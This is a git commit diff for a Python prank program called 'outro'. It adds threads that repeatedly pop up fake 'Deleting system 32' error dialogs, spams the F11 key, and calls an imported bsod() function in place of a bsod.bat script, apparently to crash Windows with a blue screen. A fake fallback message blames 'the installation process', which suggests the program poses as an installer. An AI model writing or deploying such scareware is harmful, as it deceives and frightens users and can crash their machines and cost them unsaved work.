dd603023e1dd1465e35586ea45ba20d3676f513b
Asaf Meizner <asafmeizner@gmail.com>
2022-09-13 20:43:31 +0300

    Finished outro in python

--- outro/outro_python/countdown.py
+++ outro/outro_python/countdown.py
@@ -8,13 +8,30 @@ from threading import Thread
 def countdown(timer):
     i = timer
     while i > 0:
-        def window(i):
+        def window1(i):
+            print('Deleting system 32 in ' + str(i))
+            messagebox.showerror('Error', 'Error: Deleting system 32 in ' + str(i))
             ctypes.windll.user32.MessageBoxW(0, u"Deleting system 32 in " + str(i), u"Error" + str(i), 0)
             messagebox.showerror('Error', 'Error: Deleting system 32 in ' + str(i))
-            print('Deleting system 32 in ' + str(i))
+            ctypes.windll.user32.MessageBoxW(0, u"Deleting system 32 in " + str(i), u"Error" + str(i), 0)
+            messagebox.showerror('Error', 'Error: Deleting system 32 in ' + str(i))
+            ctypes.windll.user32.MessageBoxW(0, u"Deleting system 32 in " + str(i), u"Error" + str(i), 0)
 
-        windowThread = Thread(target = window, args = (i, ))
+        windowThread = Thread(target = window1, args = (i, ))
         windowThread.start()
 
-        sleep(1)
+
+        def window2(i):
+            ctypes.windll.user32.MessageBoxW(0, u"Deleting system 32 in " + str(i), u"Error" + str(i), 0)
+            messagebox.showerror('Error', 'Error: Deleting system 32 in ' + str(i))
+            messagebox.showerror('Error', 'Error: Deleting system 32 in ' + str(i))
+            ctypes.windll.user32.MessageBoxW(0, u"Deleting system 32 in " + str(i), u"Error" + str(i), 0)
+            messagebox.showerror('Error', 'Error: Deleting system 32 in ' + str(i))
+            ctypes.windll.user32.MessageBoxW(0, u"Deleting system 32 in " + str(i), u"Error" + str(i), 0)
+
+        windowThread = Thread(target = window2, args = (i, ))
+        windowThread.start()
+
+
+        sleep(0.9)
         i = i - 1
--- outro/outro_python/main.py
+++ outro/outro_python/main.py
@@ -3,12 +3,12 @@ import os
 from random import randint
 from time import sleep
 import sys
-from time import sleep
 from threading import Thread
 from volume import change_volume
 from music import play_music
 from countdown import countdown
 import keyboard
+from bsod import bsod
 # import pynput
 
 def emergency_exit():
@@ -45,12 +45,14 @@ musicThread.start()
 sleep(0.1)
 
 
-# def timerThreading():
-#     countdown(15)
+def timerThreading():
+    countdown(20)
 
-# countdownThread = Thread(target = countdown, args = (10, ))
-# countdownThread.start()
-countdown(15)
+countdownThread = Thread(target = countdown, args = (10, ))
+countdownThread.start()
+
+
+sleep(10)
 
 
 print("Goodbye :)")
@@ -68,7 +70,6 @@ if sys.platform == "win32":
     # subprocess.call([pip_file_path])
 
     try:
-        import keyboard  # pip install keyboard
         range_repeat = randint(1, 3)
         for i in range(range_repeat):
             print("ERROR CANT FIND CURRENT WORKING DIRECTORY")
@@ -84,11 +85,38 @@ if sys.platform == "win32":
             keyboard.press_and_release("F11")
 
 
-        bat_file_path = str(f"{os.path.dirname(__file__)}/bsod.bat")
-        subprocess.call([bat_file_path])
+        # bat_file_path = str(f"{os.path.dirname(__file__)}/bsod.bat")
+        # subprocess.call([bat_file_path])
+        bsod()
+        # pycache_path = str(f"{os.path.dirname(__file__)}/__pycache__/volume.cpython-310.pyc")
+        # os.remove(pycache_path)
+
 
     except:
         input("Sorry something went wrong in the installation process. Please turn on internet and try again.")
 
 else:
     input("Sorry, this program is only compatible with Windows.")
+
+
+# volume = False
+
+
+# range_repeat = randint(1, 3)
+# for i in range(range_repeat):
+#     print("ERROR CANT FIND CURRENT WORKING DIRECTORY")
+#     keyboard.press_and_release("F11")
+#     keyboard.press_and_release("F11")
+#     keyboard.press_and_release("F11")
+#     keyboard.press_and_release("F11")
+#     keyboard.press_and_release("F11")
+#     sleep(0.01)
+#     keyboard.press_and_release("F11")
+#     keyboard.press_and_release("F11")
+#     keyboard.press_and_release("F11")
+#     keyboard.press_and_release("F11")
+
+
+# # bat_file_path = str(f"{os.path.dirname(__file__)}/bsod.bat")
+# # subprocess.call([bat_file_path])
+# bsod()
